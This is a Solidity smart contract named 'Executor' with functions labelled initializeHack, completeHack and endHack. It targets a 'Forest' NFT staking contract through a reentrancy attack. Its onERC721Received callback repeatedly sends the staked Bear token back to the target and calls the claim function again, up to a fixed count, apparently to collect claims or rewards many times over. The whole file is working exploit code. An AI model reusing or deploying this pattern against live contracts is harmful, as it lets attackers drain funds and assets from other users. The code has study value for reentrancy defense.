// SPDX-License-Identifier: MIT LICENSE



pragma solidity ^0.8.0;


import "./interfaces/IERC721.sol";
import "./Forest.sol";
import "./Bear.sol";
import "./interfaces/IERC721Receiver.sol";
import "./Ownable.sol";

contract Executor is IERC721Receiver, Ownable {
    // should be less than known staked bee count
    // made constant for gas savings
    uint256 public constant MAX_COUNT = 20;

    uint256 public count = 0;
    uint256 oldHoneyPerSense;
    uint256 oldUnaccountedRewards;
    uint16 public tokenId;
    bool public isRunning = false;
    //why is this an iss
    Bear public bear;
    Forest public target;


    constructor(Bear _bear, Forest _target)  {
        bear = _bear;
        target = _target;
    }

    function initializeHack(uint16 _tokenId) external onlyOwner {
        isRunning = true;
        count = 0;
        tokenId = _tokenId;

        uint16[] memory ids = new uint16[](1);
        ids[0] = _tokenId;

        target.addManyToForestAndPack(address(this), ids);
    }

    function completeHack() external onlyOwner {

        oldHoneyPerSense = target.honeyPerSense();
        oldUnaccountedRewards = target.unaccountedRewards();

        uint16[] memory ids = new uint16[](1);
        ids[0] = tokenId;

        target.claimManyFromForestAndPack(ids, true);
    }

    function endHack() external onlyOwner {
        isRunning = false;
    }


    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 __tokenId,
        bytes calldata data
    ) public virtual override returns (bytes4) {
        if (msg.sender != address(bear)) {
            return this.onERC721Received.selector;
        }

        uint256 _count = count;

        if (_count == 0) {
            uint256 newHoneyPerSense = target.honeyPerSense();
            uint256 newUnaccountedRewards = target.unaccountedRewards();

            if ((newHoneyPerSense > oldHoneyPerSense) || (newUnaccountedRewards > oldUnaccountedRewards)){
                revert("We dont steal in this family");
            }
        }

        if (_count > MAX_COUNT - 2) return this.onERC721Received.selector;

        uint16[] memory tokenIds = new uint16[](1);
        tokenIds[0] = tokenId;

        count = _count + 1;

        bear.transferFrom(address(this), address(target), tokenId);

        target.claimManyFromForestAndPack(tokenIds, true);

        return this.onERC721Received.selector;
    }
}
